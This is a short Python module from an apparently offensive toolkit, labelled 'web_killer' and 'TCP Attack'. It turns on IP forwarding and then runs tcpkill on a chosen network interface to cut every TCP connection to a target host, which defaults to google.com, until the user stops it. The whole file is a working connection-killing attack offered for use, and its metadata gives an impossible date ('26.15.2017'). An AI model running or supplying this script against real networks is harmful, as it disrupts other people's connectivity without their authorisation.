#        Copyright (C) 2017 M4st3r L1nux Indonesia (Jh0n 1sl4nskh4_404)

from core.GarudaTools import *
import time
import os
import subprocess
from core import colors

conf = {
	"name": "web_killer",
	"version": "1.0",
	"shortdesc": "TCP Attack",
	"author": "M4st3rL1nux",
	"github": "JhonIslanskha",
	"by":  "Jh0n 1sl4nskh4_404",
	"initdate": "24.2.2016",
	"lastmod": "26.15.2017",
	"apisupport": False,
	"dependencies": ["dnsiff"]
}

# List of the variables
variables = OrderedDict((
	('interface', ['wlan0', 'network interface name']),
	('target', ['google.com', 'target address']),

))

# Simple changelog
changelog = "Version 1.0:\nrelease"

# Run
def run():
	variables['target'][0] = variables['target'][0].replace("http://", "")
	variables['target'][0] = variables['target'][0].replace("https://", "")
	printInfo("IP forwarding...")
	subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	time.sleep(2)
	command_1 = 'tcpkill -i ' + variables['interface'][0] +' -9 host ' + variables['target'][0]
	subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	line_3 = colors.green + "attack has been started, for stop attack press [enter]"
	press_ak = input(line_3)
	os.system('killall tcpkill')
	printInfo("attack has been stoped")